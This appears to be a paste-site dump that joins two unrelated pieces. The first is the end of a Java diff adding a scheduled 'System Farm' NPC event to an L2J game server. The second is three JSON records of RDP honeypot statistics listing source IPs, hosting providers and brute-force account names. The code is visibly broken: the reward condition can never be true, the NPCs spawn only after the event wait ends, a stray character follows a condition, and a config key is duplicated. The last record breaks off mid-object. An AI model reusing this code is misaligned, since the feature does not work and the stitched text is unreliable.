+					SYSTEM_EVENT_NPCID_TYPE_ONE_COORDINATES[2] = Integer.parseInt(propertySplit[2]);
+					
+				}
+				
+				String[] tlk = l2jdev.getProperty(""RaidNpcCoordinatesTwo"", ""0,0,0"").split("","");
+				if (tlk.length < 3)
+				{
+					SYSTEM_EVENT_NPCID_TYPE_TWO_COORDINATES[0] = 83456;
+					SYSTEM_EVENT_NPCID_TYPE_TWO_COORDINATES[1] = 148611;
+					SYSTEM_EVENT_NPCID_TYPE_TWO_COORDINATES[2] = -3408;
+				}
+				else
+				{
+					SYSTEM_EVENT_NPCID_TYPE_TWO_COORDINATES[0] = Integer.parseInt(tlk[0]);
+					SYSTEM_EVENT_NPCID_TYPE_TWO_COORDINATES[1] = Integer.parseInt(tlk[1]);
+					SYSTEM_EVENT_NPCID_TYPE_TWO_COORDINATES[2] = Integer.parseInt(tlk[2]);
+					
+				}
+			}
+			catch (Exception e)
+			{
+				e.printStackTrace();
+			}
+			
+		}
+		
+		public void StartingCheck()
+		{
+			_starting = true;
+			_aborted = false;
+			
+			World.announceToOnlinePlayers(""Announce: "" + ""System Farm Event Duration: "" + SYSTEMFARM_TIME + "" Hour(s)!"", true);
+			waiter(SYSTEMFARM_TIME * 60 * 1000);
+			if (!_aborted)
+				finishEvent();
+			
+			int[] coorone = SYSTEM_EVENT_NPCID_TYPE_ONE_COORDINATES;
+			spawnNPC(coorone[0], coorone[1], coorone[2], SYSTEMFARM_NPC_ID_TYPE_ONE);
+			
+			int[] coorTwo = SYSTEM_EVENT_NPCID_TYPE_TWO_COORDINATES;
+			spawnNPC(coorTwo[0], coorTwo[1], coorTwo[2], SYSTEMFARM_NPC_ID_TYPE_TWO);
+		}
+		
+		public void finishEvent()
+		{
+			startCalculationOfNextEventTime();
+			
+			_starting = false;
+			_aborted = true;
+			World.announceToOnlinePlayers(""Announce:"" + "" Next System Farm Event: "" + getNextTime(), true);
+			
+			cleanNpc();
+			
+		}
+		
+		public void cleanNpc()
+		{
+			if (!MonsterEvent.isEmpty())
+			{
+				for (Spawn npc : MonsterEvent)
+				{
+					npc.getNpc().deleteMe();
+				}
+				MonsterEvent.clear();
+			}
+		}
+		
+		protected void waiter(long interval)
+		{
+			long startWaiterTime = System.currentTimeMillis();
+			int seconds = (int) (interval / 1000L);
+			while (((startWaiterTime) + interval > System.currentTimeMillis()) && !_aborted)
+			{
+				seconds--;
+				switch (seconds)
+				{
+					case 10800:
+						if (_starting)
+							World.announceToOnlinePlayers(""Announce: System Farm Event "" + seconds / 60 / 60 + "" hour(s) till event finish!"", true);
+						break;
+					
+					case 7200:
+						if (_starting)
+							World.announceToOnlinePlayers(""Announce: System Farm Event "" + seconds / 60 / 60 + "" hour(s) till event finish!"", true);
+						break;
+					
+					case 3600:
+						if (_starting)
+							World.announceToOnlinePlayers(""Announce: System Farm Event "" + seconds / 60 / 60 + "" hour(s) till event finish!"", true);
+						break;
+					case 60:
+					case 120:
+					case 180:
+					case 240:
+					case 300:
+					case 600:
+					case 900:
+					case 1800:
+						if (_starting)
+							World.announceToOnlinePlayers(""Announce: System Farm Event "" + seconds / 60 + "" minute(s) till event finish!"", true);
+						break;
+					case 1:
+					case 2:
+					case 3:
+					case 10:
+					case 15:
+					case 30:
+						if (_starting)
+							World.announceToOnlinePlayers(""Announce: System Farm Event "" + seconds + "" second(s) till event finish!"", true);
+						break;
+				}
+				long startOneSecondWaiterStartTime = System.currentTimeMillis();
+				while (startOneSecondWaiterStartTime + 1000L > System.currentTimeMillis())
+					try
+					{
+						Thread.sleep(1L);
+					}
+					catch (InterruptedException ie)
+					{
+						ie.printStackTrace();
+						LOGGER.info(""Error Clock waiter System Farm Event."");
+					}
+			}
+		}
+		
+		public static ExProperties load(String filename)
+		{
+			return load(new File(filename));
+		}
+		
+		public static ExProperties load(File file)
+		{
+			ExProperties result = new ExProperties();
+			
+			try
+			{
+				result.load(file);
+			}
+			catch (IOException e)
+			{
+				LOGGER.error(""Error loading config : "" + file.getName() + ""!"", e);
+			}
+			
+			return result;
+		}
+		
+		public String getNextTime()
+		{
+			if (NextEvent.getTime() != null)
+			{
+				SimpleDateFormat formatWithAmPm = new SimpleDateFormat(""hh:mm a"");
+				return formatWithAmPm.format(NextEvent.getTime());
+			}
+			return ""Error"";
+		}
+		
+		public void startCalculationOfNextEventTime()
+		{
+			try
+			{
+				Calendar currentTime = Calendar.getInstance();
+				Calendar testStartTime = null;
+				long flush2 = 0L;
+				long timeL = 0L;
+				int count = 0;
+				for (String timeOfDay : SYSTEMFARM_EVENT_BY_TIME_OF_DAY)
+				{
+					testStartTime = Calendar.getInstance();
+					testStartTime.setLenient(true);
+					String[] splitTimeOfDay = timeOfDay.split("":"");
+					testStartTime.set(11, Integer.parseInt(splitTimeOfDay[0]));
+					testStartTime.set(12, Integer.parseInt(splitTimeOfDay[1]));
+					testStartTime.set(13, 0);
+					if (testStartTime.getTimeInMillis() < currentTime.getTimeInMillis())
+						testStartTime.add(5, 1);
+					timeL = testStartTime.getTimeInMillis() - currentTime.getTimeInMillis();
+					if (count == 0)
+					{
+						flush2 = timeL;
+						NextEvent = testStartTime;
+					}
+					if (timeL < flush2)
+					{
+						flush2 = timeL;
+						NextEvent = testStartTime;
+					}
+					count++;
+				}
+				LOGGER.info(""System Farm Event: Next Event ["" + NextEvent.getTime().toString() + ""]"");
+				ThreadPool.schedule(new StartEventTask(), flush2);
+			}
+			catch (Exception e)
+			{
+				System.out.println(""[System Farm Event]: "" + e);
+			}
+		}
+		
+		private class StartEventTask implements Runnable
+		{
+			StartEventTask()
+			{
+			}
+			
+			@Override
+			public void run()
+			{
+				StartingCheck();
+			}
+		}
+		
+		public void reload()
+		
+		{
+			try
+			{
+				ExProperties l2jdev = load(SYSTEM_FARM_FILE);
+				SYSTEMFARM_EVENT_ENABLE = l2jdev.getProperty(""SystemFarmEventEnable"", false);
+				
+				SYSTEMFARM_EVENT_BY_TIME_OF_DAY = l2jdev.getProperty(""EventTimeOfDay"", ""20:00"").split("","");
+				SYSTEMFARM_TIME = l2jdev.getProperty(""EventTime"", 60);
+				
+				SYSTEMFARM_NPC_ID_TYPE_ONE = l2jdev.getProperty(""RaidSpawnNpcIdTypeOne"", 300);
+				SYSTEMFARM_NPC_ID_TYPE_TWO = l2jdev.getProperty(""RaidSpawnNpcIdTypeTwo"", 300);
+				
+				itemId = l2jdev.getProperty(""itemId"", 57);
+				count = l2jdev.getProperty(""count"", 100);
+				
+				String[] propertySplit = l2jdev.getProperty(""RaidNpcCoordinatesOne"", ""0,0,0"").split("","");
+				if (propertySplit.length < 3)
+				{
+					SYSTEM_EVENT_NPCID_TYPE_ONE_COORDINATES[0] = 83456;
+					SYSTEM_EVENT_NPCID_TYPE_ONE_COORDINATES[1] = 148611;
+					SYSTEM_EVENT_NPCID_TYPE_ONE_COORDINATES[2] = -3408;
+				}
+				else
+				{
+					SYSTEM_EVENT_NPCID_TYPE_ONE_COORDINATES[0] = Integer.parseInt(propertySplit[0]);
+					SYSTEM_EVENT_NPCID_TYPE_ONE_COORDINATES[1] = Integer.parseInt(propertySplit[1]);
+					SYSTEM_EVENT_NPCID_TYPE_ONE_COORDINATES[2] = Integer.parseInt(propertySplit[2]);
+					
+				}
+				
+				String[] tlk = l2jdev.getProperty(""RaidNpcCoordinatesTwo"", ""0,0,0"").split("","");
+				if (tlk.length < 3)
+				{
+					SYSTEM_EVENT_NPCID_TYPE_TWO_COORDINATES[0] = 83456;
+					SYSTEM_EVENT_NPCID_TYPE_TWO_COORDINATES[1] = 148611;
+					SYSTEM_EVENT_NPCID_TYPE_TWO_COORDINATES[2] = -3408;
+				}
+				else
+				{
+					SYSTEM_EVENT_NPCID_TYPE_TWO_COORDINATES[0] = Integer.parseInt(tlk[0]);
+					SYSTEM_EVENT_NPCID_TYPE_TWO_COORDINATES[1] = Integer.parseInt(tlk[1]);
+					SYSTEM_EVENT_NPCID_TYPE_TWO_COORDINATES[2] = Integer.parseInt(tlk[2]);
+					
+				}
+			}
+			catch (Exception e)
+			{
+				e.printStackTrace();
+			}
+		}
+		
+		protected Spawn spawnNPC(int xPos, int yPos, int zPos, int npcId)
+		{
+			final NpcTemplate template = NpcData.getInstance().getTemplate(npcId);
+			
+			try
+			{
+				final Spawn spawn = new Spawn(template);
+				spawn.setLoc(xPos, yPos, zPos, 0);
+				spawn.setRespawnDelay(1);
+				spawn.doSpawn(false);
+				MonsterEvent.add(spawn);
+				return spawn;
+			}
+			catch (Exception e)
+			{
+				return null;
+			}
+		}
+		
+		public void onDeath(Player player, Npc monster)
+		{
+			if (_starting)
+			{
+				ItemInstance item = ItemInstance.create(itemId, count, player, monster);
+				
+				if (monster.getNpcId() == SYSTEMFARM_NPC_ID_TYPE_ONE && monster.getNpcId() == SYSTEMFARM_NPC_ID_TYPE_TWO)
+				{
+					if (Config.AUTO_LOOT && player.getInventory().validateCapacity(item))
+					{
+						if (player.isVip())
+						{
+							player.getInventory().addItem(""Cube Reward"", item.getItemId(), item.getCount() * 2, player, monster);
+							
+							if (item.getCount() > 1)
+								player.sendPacket(SystemMessage.getSystemMessage(SystemMessageId.EARNED_S2_S1_S).addItemName(item.getItemId()).addItemNumber(item.getCount() * 2));
+							else
+								player.sendPacket(SystemMessage.getSystemMessage(SystemMessageId.EARNED_ITEM_S1).addItemName(item.getItemId()));
+						}
+						else
+						{
+							player.getInventory().addItem(""Cube Reward"", item.getItemId(), item.getCount(), player, player);
+							
+							if (item.getCount() > 1)
+								player.sendPacket(SystemMessage.getSystemMessage(SystemMessageId.EARNED_S2_S1_S).addItemName(item.getItemId()).addItemNumber(item.getCount()));
+							else
+								player.sendPacket(SystemMessage.getSystemMessage(SystemMessageId.EARNED_ITEM_S1).addItemName(item.getItemId()));
+	
+						}
+						player.sendPacket(new ItemList(player, false));
+					}
+					else
+					{
+						item.dropMe(monster, monster.getX(), monster.getY() + 30, monster.getZ());
+					}
+					
+				}
+			}
+		}
+		
+		public static SystemFarmManager getInstance()
+		{
+			return SingletonHolder.INSTANCE;
+		}
+		
+		private static class SingletonHolder
+		{
+			protected static final SystemFarmManager INSTANCE = new SystemFarmManager();
+		}
+		
+	}


Index: java/net/sf/l2j/gameserver/handler/admincommandhandlers/AdminAdmin.java
===================================================================
--- java/net/sf/l2j/gameserver/handler/admincommandhandlers/AdminAdmin.java	(BAN - L2JDEV www.l2jdev.com.br)
+++ java/net/sf/l2j/gameserver/handler/admincommandhandlers/AdminAdmin.java	


+	import net.sf.l2j.gameserver.dev.systemFarm.SystemFarmManager;
import net.sf.l2j.gameserver.handler.IAdminCommandHandler;


	else if (type.startsWith(""config""))
	{
		Config.loadGameServer();
+		SystemFarmManager.getInstance().reload();
		activeChar.sendMessage(""Configs files have been reloaded."");
	}


Index: java/net/sf/l2j/gameserver/model/actor/Attackable.java
===================================================================
--- java/net/sf/l2j/gameserver/model/actor/Attackable.java	(BAN - L2JDEV www.l2jdev.com.br)
+++ java/net/sf/l2j/gameserver/model/actor/Attackable.java	

import net.sf.l2j.Config;
+import net.sf.l2j.gameserver.dev.systemFarm.SystemFarmManager;

@Override
public boolean doDie(Creature killer)
{
	if (!super.doDie(killer))1
		return false;

+	if (this instanceof Monster)
+		{
+			final Monster monster = (Monster) this;
+			
+			SystemFarmManager.getInstance().onDeath((Player) killer, monster);
+		}

_attackedBy.clear();
}


Index: java/net/sf/l2j/gameserver/gameserver.java
===================================================================
--- java/net/sf/l2j/gameserver/gameserver.java	(BAN - L2JDEV www.l2jdev.com.br)
+++ java/net/sf/l2j/gameserver/gameserver.java	

	StringUtil.printSection(""Olympiads & Heroes"");
	OlympiadGameManager.getInstance();
	Olympiad.getInstance();
	HeroManager.getInstance();

+	StringUtil.printSection(""System Farm Manager"");
+	SystemFarmManager.getInstance();
+	if (SystemFarmManager.SYSTEMFARM_EVENT_ENABLE)
+			SystemFarmManager.getInstance().startCalculationOfNextEventTime();

	StringUtil.printSection(""Four Sepulchers"");
	
	
Index: config/SystemFarmManager.properties
===================================================================
--- config/SystemFarmManager.properties	(BAN - L2JDEV www.l2jdev.com.br)
+++ config/SystemFarmManager.properties

+	#============================================================#
+	#            New System Farm Manager                         #
+	#        JDev Project - WWWW.L2JDEV.COM.BR                   #
+	#============================================================#
+	
+	# Enable Event Manager
+	SystemFarmEventEnable = True
+	
+	# Setting the System Farm start time
+	# The BattleStatingTime variable defines the System Farm start times.
+	# It is a list of times in the format HH:mm,HH:mm,HH:mm
+	EventTimeOfDay = 06:00,06:10,19:16,19:26
+	
+	# Configuring System Farm Duration Event interval
+	# The BattleInvervalDuration variable defines the duration, in minute, of the running period
+	EventTime = 60
+	
+	# Configuring System Farm Npc RegisterId
+	RaidSpawnNpcIdTypeOne = 102
+	RaidSpawnNpcIdTypeOne = 103
+	
+	# Configuring System Farm Npc Location
+	RaidNpcCoordinatesOne = 83456,148611,-3408
+	RaidNpcCoordinatesTwo = 83456,148611,-3408
+	
+	itemId = 57
+	count = 100"
Pkq3NZeu,2024-01-15_stats.json,rdp_snitch,JSON,Monday 15th of January 2024 06:18:30 PM CDT,"{
  ""ip"": {
    ""158.220.82.163"": 489,
    ""80.66.76.92"": 6,
    ""194.165.17.21"": 63,
    ""109.69.7.157"": 18,
    ""74.105.22.131"": 60,
    ""198.235.24.236"": 9,
    ""103.56.61.130"": 6,
    ""213.97.250.153"": 54,
    ""194.165.16.72"": 6,
    ""20.102.104.36"": 3,
    ""45.227.254.55"": 6,
    ""77.90.185.2"": 9,
    ""87.251.75.145"": 9,
    ""185.170.144.3"": 6,
    ""168.119.66.109"": 18,
    ""87.251.75.120"": 6,
    ""202.55.132.183"": 3,
    ""198.235.24.218"": 9,
    ""112.46.117.178"": 6,
    ""196.190.117.7"": 6,
    ""216.73.161.231"": 3,
    ""5.250.180.52"": 3,
    ""81.143.229.7"": 6,
    ""103.28.70.53"": 15,
    ""152.32.206.181"": 3,
    ""58.218.204.183"": 9,
    ""81.19.135.2"": 9,
    ""123.56.20.194"": 3,
    ""198.235.24.33"": 9,
    ""194.165.16.11"": 6,
    ""103.184.47.83"": 3,
    ""37.19.200.111"": 15,
    ""45.58.126.154"": 3,
    ""185.196.220.41"": 9,
    ""45.227.254.54"": 6,
    ""193.142.146.227"": 9,
    ""87.251.75.64"": 3,
    ""113.31.31.153"": 3,
    ""45.93.20.204"": 9,
    ""206.189.157.63"": 12,
    ""216.73.160.116"": 3,
    ""158.69.145.21"": 70188,
    ""198.235.24.75"": 9,
    ""36.91.222.100"": 3
  },
  ""asn"": {
    ""AS51167"": 489,
    ""AS208091"": 24,
    ""AS48721"": 75,
    ""AS21183"": 18,
    ""AS701"": 60,
    ""AS396982"": 36,
    ""AS4837"": 9,
    ""AS3352"": 54,
    ""AS8075"": 3,
    ""AS267784"": 12,
    ""AS198465"": 9,
    ""AS197414"": 6,
    ""AS24940"": 18,
    ""AS63737"": 3,
    ""AS9808"": 6,
    ""AS24757"": 6,
    ""AS206092"": 6,
    ""AS8560"": 3,
    ""AS2856"": 6,
    ""AS213122"": 15,
    ""AS135377"": 3,
    ""AS4134"": 9,
    ""AS209588"": 9,
    ""AS37963"": 3,
    ""AS146817"": 3,
    ""AS212238"": 15,
    ""AS23470"": 3,
    ""AS208046"": 18,
    ""AS57523"": 9,
    ""AS14061"": 12,
    ""AS16276"": 70188,
    ""AS7713"": 3
  },
  ""isp"": {
    ""Contabo GmbH"": 489,
    ""Xhost Internet Solutions LP"": 30,
    ""Flyservers S.A."": 96,
    ""Vodafone Network"": 18,
    ""Verizon Business"": 60,
    ""Google LLC"": 36,
    ""CHINAUNICOM CHINA169 Jiangsu Province Network"": 6,
    ""Telefonica de Espana SAU"": 54,
    ""Microsoft Corporation"": 3,
    ""BtHoster LTD"": 9,
    ""Hetzner Online GmbH"": 18,
    ""Vietserver Services Technology Company Limited"": 3,
    ""China Mobile"": 6,
    ""Ethiotelecom"": 6,
    ""Ipxo Limited"": 6,
    ""IONOS SE"": 3,
    ""BT Public Internet Service"": 6,
    ""Hyonix LLC"": 15,
    ""UCLOUD INFORMATION TECHNOLOGY (HK) LIMITED"": 3,
    ""Chinanet"": 9,
    ""Hangzhou Alibaba Advertising Co"": 3,
    ""Hubei Feixun Network Co., Ltd"": 3,
    ""Datacamp Limited"": 15,
    ""ReliableSite.Net LLC"": 3,
    ""ColocationX Ltd."": 18,
    ""CNC Group CHINA169 Tianjin Province network"": 3,
    ""Chang Way Technologies Co. Limited"": 9,
    ""DigitalOcean, LLC"": 12,
    ""OVH Hosting"": 70188,
    ""PT Telekomunikasi Indonesia"": 3
  },
  ""org"": {
    ""Contabo GmbH"": 489,
    ""Xhost Internet Solutions"": 24,
    ""Flyservers S.A"": 75,
    ""Unknown"": 70218,
    ""Verizon Business"": 60,
    ""Palo Alto Networks, Inc"": 36,
    ""Zhenjiang Guangyuan Network Technology Co., Ltd."": 6,
    ""RIMA (Red IP Multi Acceso)"": 54,
    ""Microsoft Azure Cloud (eastus)"": 3,
    ""UAB Host Baltic"": 12,
    ""BtHoster LTD"": 9,
    ""Xhostis"": 6,
    ""Hetzner"": 18,
    ""VietServer Services technology company limited"": 3,
    ""China Mobile Communications Corporation"": 6,
    ""Bandito Networks"": 6,
    ""IONOS"": 3,
    ""HostUS"": 15,
    ""Ucloud Information Technology"": 3,
    ""Chinanet JS"": 9,
    ""Alviva Holding Limited"": 9,
    ""Aliyun Computing Co., LTD"": 3,
    ""Hubei Feixun Network Co., Ltd"": 3,
    ""Cdnext DAL"": 15,
    ""Herrera Mario"": 3,
    ""Makut Investments"": 9,
    ""ColocationX Ltd"": 9,
    ""BeiJing QianJingShiJi Co., Ltd."": 3,
    ""Starcrecium Limited"": 9,
    ""DigitalOcean, LLC"": 12,
    ""Telekomunikasi Indonesia"": 3
  },
  ""regionName"": {
    ""England"": 495,
    ""North Holland"": 39,
    ""Kaunas"": 75,
    ""Tirana"": 18,
    ""New Jersey"": 60,
    ""California"": 36,
    ""Jiangsu"": 15,
    ""Madrid"": 54,
    ""Virginia"": 15,
    ""Vilnius"": 12,
    ""Bavaria"": 9,
    ""Saxony"": 18,
    ""Da Nang"": 3,
    ""Guangdong"": 6,
    ""Addis Ababa"": 6,
    ""New York"": 6,
    ""North Rhine-Westphalia"": 3,
    ""Texas"": 30,
    ""Hesse"": 9,
    ""Beijing"": 3,
    ""Hubei"": 3,
    ""Florida"": 3,
    ""Tianjin"": 3,
    ""Moscow"": 9,
    ""Central Singapore"": 12,
    ""Quebec"": 70188,
    ""Jakarta"": 3
  },
  ""country"": {
    ""United Kingdom"": 495,
    ""The Netherlands"": 39,
    ""Lithuania"": 87,
    ""Albania"": 18,
    ""United States"": 150,
    ""China"": 30,
    ""Spain"": 54,
    ""Germany"": 39,
    ""Vietnam"": 3,
    ""Ethiopia"": 6,
    ""Russia"": 9,
    ""Singapore"": 12,
    ""Canada"": 70188,
    ""Indonesia"": 3
  },
  ""account"": {
    ""hello"": 573,
    ""Administr"": 36,
    ""142.93.8.59"": 195,
    ""IQYLHMGqw"": 3,
    ""WIlJSA"": 3,
    ""VrRWjm"": 3,
    ""nmap"": 6,
    ""Test"": 39,
    ""Domain"": 45,
    ""ERIosTyqe"": 3,
    ""EGAudi"": 3,
    ""wbZERN"": 3,
    ""(empty)"": 12,
    ""Administrator"": 3,
    ""CptQApKMN"": 3,
    ""XdOtjW"": 3,
    ""HrOFHA"": 3,
    ""NCRACK_USER"": 70188,
    ""RPWCsiMRn"": 3,
    ""nJgjac"": 3,
    ""vxQEoz"": 3
  },
  ""keyboard"": {
    ""Unknown"": 71133
  },
  ""client_build"": {
    ""Unknown"": 71133
  },
  ""client_name"": {
    ""Unknown"": 71133
  },
  ""ip_type"": {
    ""hosting"": 570,
    ""Unknown"": 318,
    ""proxy"": 18,
    ""mobile"": 18,
    ""mobile & proxy"": 6,
    ""hosting & proxy"": 70203
  }
}"
BqnHtY48,2024-01-15_stats.json,rdp_snitch,JSON,Monday 15th of January 2024 06:16:13 PM CDT,"{
  ""ip"": {
    ""158.220.82.163"": 326,
    ""80.66.76.92"": 4,
    ""194.165.17.21"": 42,
    ""109.69.7.157"": 12,
    ""74.105.22.131"": 40,
    ""198.235.24.236"": 6,
    ""103.56.61.130"": 4,
    ""213.97.250.153"": 36,
    ""194.165.16.72"": 4,
    ""20.102.104.36"": 2,
    ""45.227.254.55"": 4,
    ""77.90.185.2"": 6,
    ""87.251.75.145"": 6,
    ""185.170.144.3"": 4,
    ""168.119.66.109"": 12,
    ""87.251.75.120"": 4,
    ""202.55.132.183"": 2,
    ""198.235.24.218"": 6,
    ""112.46.117.178"": 4,
    ""196.190.117.7"": 4,
    ""216.73.161.231"": 2,
    ""5.250.180.52"": 2,
    ""81.143.229.7"": 4,
    ""103.28.70.53"": 10,
    ""152.32.206.181"": 2,
    ""58.218.204.183"": 6,
    ""81.19.135.2"": 6,
    ""123.56.20.194"": 2,
    ""198.235.24.33"": 6,
    ""194.165.16.11"": 4,
    ""103.184.47.83"": 2,
    ""37.19.200.111"": 10,
    ""45.58.126.154"": 2,
    ""185.196.220.41"": 6,
    ""45.227.254.54"": 4,
    ""193.142.146.227"": 6,
    ""87.251.75.64"": 2,
    ""113.31.31.153"": 2,
    ""45.93.20.204"": 6,
    ""206.189.157.63"": 8,
    ""216.73.160.116"": 2,
    ""158.69.145.21"": 46792,
    ""198.235.24.75"": 6,
    ""36.91.222.100"": 2
  },
  ""asn"": {
    ""AS51167"": 326,
    ""AS208091"": 16,
    ""AS48721"": 50,
    ""AS21183"": 12,
    ""AS701"": 40,
    ""AS396982"": 24,
    ""AS4837"": 6,
    ""AS3352"": 36,
    ""AS8075"": 2,
    ""AS267784"": 8,
    ""AS198465"": 6,
    ""AS197414"": 4,
    ""AS24940"": 12,
    ""AS63737"": 2,
    ""AS9808"": 4,
    ""AS24757"": 4,
    ""AS206092"": 4,
    ""AS8560"": 2,
    ""AS2856"": 4,
    ""AS213122"": 10,
    ""AS135377"": 2,
    ""AS4134"": 6,
    ""AS209588"": 6,
    ""AS37963"": 2,
    ""AS146817"": 2,
    ""AS212238"": 10,
    ""AS23470"": 2,
    ""AS208046"": 12,
    ""AS57523"": 6,
    ""AS14061"": 8,
    ""AS16276"": 46792,
    ""AS7713"": 2
  },
  ""isp"": {
    ""Contabo GmbH"": 326,
    ""Xhost Internet Solutions LP"": 20,
    ""Flyservers S.A."": 64,
    ""Vodafone Network"": 12,
    ""Verizon Business"": 40,
    ""Google LLC"": 24,
    ""CHINAUNICOM CHINA169 Jiangsu Province Network"": 4,
    ""Telefonica de Espana SAU"": 36,
    ""Microsoft Corporation"": 2,
    ""BtHoster LTD"": 6,
    ""Hetzner Online GmbH"": 12,
    ""Vietserver Services Technology Company Limited"": 2,
    ""China Mobile"": 4,
    ""Ethiotelecom"": 4,
    ""Ipxo Limited"": 4,
    ""IONOS SE"": 2,
    ""BT Public Internet Service"": 4,
    ""Hyonix LLC"": 10,
    ""UCLOUD INFORMATION TECHNOLOGY (HK) LIMITED"": 2,
    ""Chinanet"": 6,
    ""Hangzhou Alibaba Advertising Co"": 2,
    ""Hubei Feixun Network Co., Ltd"": 2,
    ""Datacamp Limited"": 10,
    ""ReliableSite.Net LLC"": 2,
    ""ColocationX Ltd."": 12,
    ""CNC Group CHINA169 Tianjin Province network"": 2,
    ""Chang Way Technologies Co. Limited"": 6,
    ""DigitalOcean, LLC"": 8,
    ""OVH Hosting"": 46792,
    ""PT Telekomunikasi Indonesia"": 2
  },
  ""org"": {
    ""Contabo GmbH"": 326,
    ""Xhost Internet Solutions"": 16,
    ""Flyservers S.A"": 50,
    ""Unknown"": 46812,
    ""Verizon Business"": 40,
    ""Palo Alto Networks, Inc"": 24,
    ""Zhenjiang Guangyuan Network Technology Co., Ltd."": 4,
    ""RIMA (Red IP Multi Acceso)"": 36,
    ""Microsoft Azure Cloud (eastus)"": 2,
    ""UAB Host Baltic"": 8,
    ""BtHoster LTD"": 6,
    ""Xhostis"": 4,
    ""Hetzner"": 12,
    ""VietServer Services technology company limited"": 2,
    ""China Mobile Communications Corporation"": 4,
    ""Bandito Networks"": 4,
    ""IONOS"": 2,
    ""HostUS"": 10,
    ""Ucloud Information Technology"": 2,
    ""Chinanet JS"": 6,
    ""Alviva Holding Limited"": 6,
    ""Aliyun Computing Co., LTD"": 2,
    ""Hubei Feixun Network Co., Ltd"": 2,
    ""Cdnext DAL"": 10,
    ""Herrera Mario"": 2,
    ""Makut Investments"": 6,
    ""ColocationX Ltd"": 6,
    ""BeiJing QianJingShiJi Co., Ltd."": 2,
    ""Starcrecium Limited"": 6,
    ""DigitalOcean, LLC"": 8,
    ""Telekomunikasi Indonesia"": 2
  },
  ""regionName"": {
    ""England"": 330,
    ""North Holland"": 26,
    ""Kaunas"": 50,
    ""Tirana"": 12,
    ""New Jersey"": 40,
    ""California"": 24,
    ""Jiangsu"": 10,
    ""Madrid"": 36,
    ""Virginia"": 10,
    ""Vilnius"": 8,
    ""Bavaria"": 6,
    ""Saxony"": 12,
    ""Da Nang"": 2,
    ""Guangdong"": 4,
    ""Addis Ababa"": 4,
    ""New York"": 4,
    ""North Rhine-Westphalia"": 2,
    ""Texas"": 20,
    ""Hesse"": 6,
    ""Beijing"": 2,
    ""Hubei"": 2,
    ""Florida"": 2,
    ""Tianjin"": 2,
    ""Moscow"": 6,
    ""Central Singapore"": 8,
    ""Quebec"": 46792,
    ""Jakarta"": 2
  },
  ""country"": {
    ""United Kingdom"": 330,
    ""The Netherlands"": 26,
    ""Lithuania"": 58,
    ""Albania"": 12,
    ""United States"": 100,
    ""China"": 20,
    ""Spain"": 36,
    ""Germany"": 26,
    ""Vietnam"": 2,
    ""Ethiopia"": 4,
    ""Russia"": 6,
    ""Singapore"": 8,
    ""Canada"": 46792,
    ""Indonesia"": 2
  },
  ""account"": {
    ""hello"": 382,
    ""Administr"": 24,
    ""142.93.8.59"": 130,
    ""IQYLHMGqw"": 2,
    ""WIlJSA"": 2,
    ""VrRWjm"": 2,
    ""nmap"": 4,
    ""Test"": 26,
    ""Domain"": 30,
    ""ERIosTyqe"": 2,
    ""EGAudi"": 2,
    ""wbZERN"": 2,
    ""(empty)"": 8,
    ""Administrator"": 2,
    ""CptQApKMN"": 2,
    ""XdOtjW"": 2,
    ""HrOFHA"": 2,
    ""NCRACK_USER"": 46792,
    ""RPWCsiMRn"": 2,
    ""nJgjac"": 2,
    ""vxQEoz"": 2
  },
  ""keyboard"": {
    ""Unknown"": 47422
  },
  ""client_build"": {
    ""Unknown"": 47422
  },
  ""client_name"": {
    ""Unknown"": 47422
  },
  ""ip_type"": {
    ""hosting"": 380,
    ""Unknown"": 212,
    ""proxy"": 12,
    ""mobile"": 12,
    ""mobile & proxy"": 4,
    ""hosting & proxy"": 46802
  }
}"
j6ThMSnM,2024-01-15_stats.json,rdp_snitch,JSON,Monday 15th of January 2024 06:15:12 PM CDT,"{
  ""ip"": {
    ""158.220.82.163"": 163,
    ""80.66.76.92"": 2,
    ""194.165.17.21"": 21,
    ""109.69.7.157"": 6,
    ""74.105.22.131"": 20,
    ""198.235.24.236"": 3,
    ""103.56.61.130"": 2,
    ""213.97.250.153"": 18,
    ""194.165.16.72"": 2,
    ""20.102.104.36"": 1,
    ""45.227.254.55"": 2,
    ""77.90.185.2"": 3,
    ""87.251.75.145"": 3,
    ""185.170.144.3"": 2,
    ""168.119.66.109"": 6,
    ""87.251.75.120"": 2,
    ""202.55.132.183"": 1,
    ""198.235.24.218"": 3,
    ""112.46.117.178"": 2,
    ""196.190.117.7"": 2,
    ""216.73.161.231"": 1,
    ""5.250.180.52"": 1,
    ""81.143.229.7"": 2,
    ""103.28.70.53"": 5,
    ""152.32.206.181"": 1,
    ""58.218.204.183"": 3,
    ""81.19.135.2"": 3,
    ""123.56.20.194"": 1,
    ""198.235.24.33"": 3,
    ""194.165.16.11"": 2,
    ""103.184.47.83"": 1,
    ""37.19.200.111"": 5,
    ""45.58.126.154"": 1,
    ""185.196.220.41"": 3,
    ""45.227.254.54"": 2,
    ""193.142.146.227"": 3,
    ""87.251.75.64"": 1,
    ""113.31.31.153"": 1,
    ""45.93.20.204"": 3,
    ""206.189.157.63"": 4,
    ""216.73.160.116"": 1,
    ""158.69.145.21"": 23396,
    ""198.235.24.75"": 3,
    ""36.91.222.100"": 1
  },
  ""asn"": {
    ""AS51167"": 163,
    ""AS208091"": 8,
    ""AS48721"": 25,
    ""AS21183"": 6,
    ""AS701"": 20,
    ""AS396982"": 12,
    ""AS4837"": 3,
    ""AS3352"": 18,
    ""AS8075"": 1,
    ""AS267784"": 4,
    ""AS198465"": 3,
    ""AS197414"": 2,
    ""AS24940"": 6,
    ""AS63737"": 1,
    ""AS9808"": 2,
    ""AS24757"": 2,
    ""AS206092"": 2,
    ""AS8560"": 1,
    ""AS2856"": 2,
    ""AS213122"": 5,
    ""AS135377"": 1,
    ""AS4134"": 3,
    ""AS209588"": 3,
    ""AS37963"": 1,
    ""AS146817"": 1,
    ""AS212238"": 5,
    ""AS23470"": 1,
    ""AS208046"": 6,
    ""AS57523"": 3,
    ""AS14061"": 4,
    ""AS16276"": 23396,
    ""AS7713"": 1
  },
  ""isp"": {
    ""Contabo GmbH"": 163,
    ""Xhost Internet Solutions LP"": 10,
    ""Flyservers S.A."": 32,
    ""Vodafone Network"": 6,
    ""Verizon Business"": 20,
    ""Google LLC"": 12,
    ""CHINAUNICOM CHINA169 Jiangsu Province Network"": 2,
    ""Telefonica de Espana SAU"": 18,
    ""Microsoft Corporation"": 1,
    ""BtHoster LTD"": 3,
    ""Hetzner Online GmbH"": 6,
    ""Vietserver Services Technology Company Limited"": 1,
    ""China Mobile"": 2,
    ""Ethiotelecom"": 2,
